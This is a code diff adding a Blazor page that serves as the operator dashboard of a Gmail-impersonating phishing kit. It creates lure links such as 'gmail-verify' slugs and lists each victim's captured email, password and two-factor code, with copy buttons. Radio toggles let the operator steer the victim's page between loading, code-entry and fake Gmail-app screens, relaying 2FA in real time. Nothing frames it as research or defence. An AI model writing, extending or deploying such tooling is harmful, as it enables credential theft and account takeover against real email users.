@@ -1,0 +1,346 @@
+@page "/dashboard"
+@rendermode InteractiveServer
+@inject LoginLogService LogService
+@inject CampaignLinkService CampaignService
+@inject AppStateService AppState
+@inject NavigationManager Nav
+@inject IJSRuntime JS
+@implements IDisposable
+
+<PageTitle>Login Log – Gmail</PageTitle>
+
+<div class="dash-shell">
+
+    <!-- ===== TOP BAR ===== -->
+    <header class="gmail-topbar">
+        <div class="gmail-topbar-left">
+            <a href="/mail" class="gmail-icon-btn gmail-menu-btn" aria-label="Back to Inbox" title="Back to Inbox">
+                <span class="material-icons">arrow_back</span>
+            </a>
+            <a href="/mail" class="gmail-logo-link">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/512px-Gmail_icon_%282020%29.svg.png"
+                     alt="Gmail" class="gmail-logo-img" />
+                <span class="gmail-logo-text">Gmail</span>
+            </a>
+            <span class="dash-page-title">
+                <span class="dash-sep">›</span>
+                Login Log
+            </span>
+        </div>
+
+        <div class="gmail-topbar-right">
+            <span class="dash-record-chip">
+                @_captured capture@(_captured != 1 ? "s" : "")
+            </span>
+            <button class="dash-clear-btn" @onclick="ClearAll"
+                    disabled="@(_captured == 0)" title="Clear all captured data">
+                <span class="material-icons">delete_sweep</span>
+                <span class="dash-btn-label">Clear captures</span>
+            </button>
+            <button class="gmail-avatar dash-avatar" aria-label="Account menu"
+                    @onclick="ToggleAccountMenu">
+                A
+            </button>
+        </div>
+    </header>
+
+    <!-- Account dropdown -->
+    @if (_showAccountMenu)
+    {
+        <div class="acct-overlay" @onclick="() => _showAccountMenu = false"></div>
+        <div class="acct-menu" role="menu">
+            <div class="acct-menu-top">
+                <div class="acct-menu-avatar">A</div>
+                <div class="acct-menu-info">
+                    <div class="acct-menu-name">Admin</div>
+                    <div class="acct-menu-email">Login Log Dashboard</div>
+                </div>
+            </div>
+            <hr class="acct-divider" />
+            <button class="acct-menu-item" role="menuitem" @onclick="@(() => Nav.NavigateTo("/mail"))">
+                <span class="material-icons">inbox</span>
+                Back to Inbox
+            </button>
+            <hr class="acct-divider" />
+            <button class="acct-menu-item acct-signout" role="menuitem" @onclick="SignOut">
+                <span class="material-icons">logout</span>
+                Sign out
+            </button>
+        </div>
+    }
+
+    <!-- ===== CONTENT ===== -->
+    <div class="dash-content">
+
+        <!-- ===== CREATE FORM ===== -->
+        <div class="cl-create-bar">
+            <div class="cl-create-field">
+                <label class="cl-create-label">Domain</label>
+                <input class="cl-create-input" type="text"
+                       @bind="_newDomain" @bind:event="oninput"
+                       list="domain-suggestions"
+                       placeholder="https://example.com" />
+                <datalist id="domain-suggestions">
+                    @foreach (var d in _links.Select(l => l.Domain).Distinct())
+                    {
+                        <option value="@d" />
+                    }
+                </datalist>
+            </div>
+            <span class="cl-create-sep">/</span>
+            <div class="cl-create-field cl-create-field-slug">
+                <label class="cl-create-label">Slug</label>
+                <input class="cl-create-input" type="text"
+                       @bind="_newSlug" @bind:event="oninput"
+                       placeholder="gmail-verify"
+                       @onkeydown="@(async e => { if (e.Key == "Enter") await CreateLink(); })" />
+            </div>
+            <button class="cl-create-btn" @onclick="CreateLink"
+                    disabled="@(string.IsNullOrWhiteSpace(_newDomain) || string.IsNullOrWhiteSpace(_newSlug))">
+                <span class="material-icons">add_link</span>
+                Create
+            </button>
+        </div>
+        @if (!string.IsNullOrEmpty(_createError))
+        {
+            <p class="cl-create-error">@_createError</p>
+        }
+
+        <!-- ===== MAIN TABLE ===== -->
+        @if (_links.Count == 0)
+        {
+            <div class="dash-empty">
+                <span class="material-icons">link</span>
+                <p>No links yet.</p>
+                <span class="dash-empty-sub">Create a domain + slug above to get started.</span>
+            </div>
+        }
+        else
+        {
+            <div class="table-wrap">
+                <div class="table-scroll">
+                    <table class="cl-table">
+                        <thead>
+                            <tr>
+                                <th>#</th>
+                                <th>Slug</th>
+                                <th>Full URL</th>
+                                <th>Email</th>
+                                <th>Password</th>
+                                <th>2FA Code</th>
+                                <th>2FA Page</th>
+                                <th>Date</th>
+                                <th></th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            @for (int i = 0; i < _links.Count; i++)
+                            {
+                                var link = _links[i];
+                                var log  = link.LoginLogs.FirstOrDefault();
+                                var idx  = i;
+                                <tr class="@(link.IsLocked ? "cl-row-captured" : "")">
+
+                                    <td class="num">@(idx + 1)</td>
+
+                                    <td class="cl-slug">
+                                        <span class="cl-slug-val">/@link.Slug</span>
+                                    </td>
+
+                                    <td class="cl-url-cell">
+                                        <span class="cl-url-val" title="@link.FullUrl">@link.FullUrl</span>
+                                        <button class="copy-btn"
+                                                @onclick="@(() => Copy(link.FullUrl, $"url-{idx}"))"
+                                                title="Copy URL">
+                                            <span class="material-icons">@(_copied == $"url-{idx}" ? "check" : "content_copy")</span>
+                                        </button>
+                                    </td>
+
+                                    <td class="email">
+                                        @if (log is not null)
+                                        {
+                                            <span class="cell-val">@log.Email</span>
+                                            <button class="copy-btn"
+                                                    @onclick="@(() => Copy(log.Email, $"email-{idx}"))"
+                                                    title="Copy">
+                                                <span class="material-icons">@(_copied == $"email-{idx}" ? "check" : "content_copy")</span>
+                                            </button>
+                                        }
+                                        else
+                                        {
+                                            <span class="cl-empty">—</span>
+                                        }
+                                    </td>
+
+                                    <td class="password">
+                                        @if (log is not null)
+                                        {
+                                            <span class="cell-val">@log.Password</span>
+                                            <button class="copy-btn"
+                                                    @onclick="@(() => Copy(log.Password, $"pass-{idx}"))"
+                                                    title="Copy">
+                                                <span class="material-icons">@(_copied == $"pass-{idx}" ? "check" : "content_copy")</span>
+                                            </button>
+                                        }
+                                        else
+                                        {
+                                            <span class="cl-empty">—</span>
+                                        }
+                                    </td>
+
+                                    <td class="code">
+                                        @if (log is null)
+                                        {
+                                            <span class="cl-empty">—</span>
+                                        }
+                                        else if (string.IsNullOrEmpty(log.Code))
+                                        {
+                                            <span class="pending">pending…</span>
+                                        }
+                                        else
+                                        {
+                                            <span class="cell-val">@log.Code</span>
+                                            <button class="copy-btn"
+                                                    @onclick="@(() => Copy(log.Code, $"code-{idx}"))"
+                                                    title="Copy">
+                                                <span class="material-icons">@(_copied == $"code-{idx}" ? "check" : "content_copy")</span>
+                                            </button>
+                                        }
+                                    </td>
+
+                                    <td class="cl-toggle-cell">
+                                        @if (link.IsLocked)
+                                        {
+                                            <div class="dash-radio-group" @key="@($"rg-{link.Id}-{link.PageMode}")">
+                                                <label class="dash-radio-label">
+                                                    <input type="radio" name="page-@link.Id"
+                                                           checked="@(link.PageMode == 0)"
+                                                           @onchange="@(() => SetPage(link, 0))" />
+                                                    <span>Loading</span>
+                                                </label>
+                                                <label class="dash-radio-label">
+                                                    <input type="radio" name="page-@link.Id"
+                                                           checked="@(link.PageMode == 1)"
+                                                           @onchange="@(() => SetPage(link, 1))" />
+                                                    <span>Code</span>
+                                                </label>
+                                                <label class="dash-radio-label">
+                                                    <input type="radio" name="page-@link.Id"
+                                                           checked="@(link.PageMode == 2)"
+                                                           @onchange="@(() => SetPage(link, 2))" />
+                                                    <span>Gmail app</span>
+                                                </label>
+                                            </div>
+                                        }
+                                        else
+                                        {
+                                            <span class="url-toggle-na">—</span>
+                                        }
+                                    </td>
+
+                                    <td class="time">@link.CreatedAt.ToLocalTime().ToString("MM-dd HH:mm")</td>
+
+                                    <td>
+                                        <button class="url-delete-btn"
+                                                @onclick="@(() => DeleteLink(link.Id))"
+                                                title="Delete">
+                                            <span class="material-icons">delete</span>
+                                        </button>
+                                    </td>
+
+                                </tr>
+                            }
+                        </tbody>
+                    </table>
+                </div>
+                <p class="count">@_links.Count link@(_links.Count != 1 ? "s" : "")</p>
+            </div>
+        }
+
+    </div>
+</div>
+
+@code {
+    private List<CampaignLink> _links = [];
+    private string _copied      = string.Empty;
+    private bool   _showAccountMenu;
+    private string _newDomain   = string.Empty;
+    private string _newSlug     = string.Empty;
+    private string _createError = string.Empty;
+
+    private int _captured => _links.Count(l => l.IsLocked);
+
+    protected override async Task OnInitializedAsync()
+    {
+        _links = await CampaignService.GetAllAsync();
+    }
+
+    protected override Task OnAfterRenderAsync(bool firstRender)
+    {
+        if (firstRender)
+            AppState.OnLogsChanged += HandleLogsChanged;
+        return Task.CompletedTask;
+    }
+
+    private void HandleLogsChanged()
+        => InvokeAsync(async () =>
+        {
+            _links = await CampaignService.GetAllAsync();
+            StateHasChanged();
+        });
+
+    private async Task CreateLink()
+    {
+        _createError = string.Empty;
+        var domain = _newDomain.Trim();
+        var slug   = _newSlug.Trim().TrimStart('/');
+
+        if (string.IsNullOrEmpty(domain) || string.IsNullOrEmpty(slug)) return;
+
+        if (!Uri.TryCreate(domain, UriKind.Absolute, out _))
+        {
+            _createError = "Domain must be a valid URL (e.g. https://example.com)";
+            return;
+        }
+
+        await CampaignService.CreateAsync(domain, slug);
+        _newSlug = string.Empty;   // keep domain so user can add more slugs
+        _links   = await CampaignService.GetAllAsync();
+    }
+
+    private async Task ClearAll()
+    {
+        await LogService.DeleteAllAsync();
+        await CampaignService.ResetAllLocksAsync();
+        _links = await CampaignService.GetAllAsync();
+    }
+
+    private async Task DeleteLink(int id)
+    {
+        await CampaignService.DeleteAsync(id);
+        _links = await CampaignService.GetAllAsync();
+    }
+
+    private async Task SetPage(CampaignLink link, int pageMode)
+    {
+        await CampaignService.SetPageModeAsync(link.Id, pageMode, AppState);
+        link.PageMode = pageMode;
+    }
+
+    private async Task Copy(string value, string key)
+    {
+        try { await JS.InvokeVoidAsync("navigator.clipboard.writeText", value); }
+        catch { /* clipboard blocked — icon still flips */ }
+        _copied = key;
+        StateHasChanged();
+        await Task.Delay(1500);
+        _copied = string.Empty;
+        StateHasChanged();
+    }
+
+    private void ToggleAccountMenu() => _showAccountMenu = !_showAccountMenu;
+    private void SignOut() => Nav.NavigateTo("/", forceLoad: true);
+
+    public void Dispose()
+        => AppState.OnLogsChanged -= HandleLogsChanged;
+}
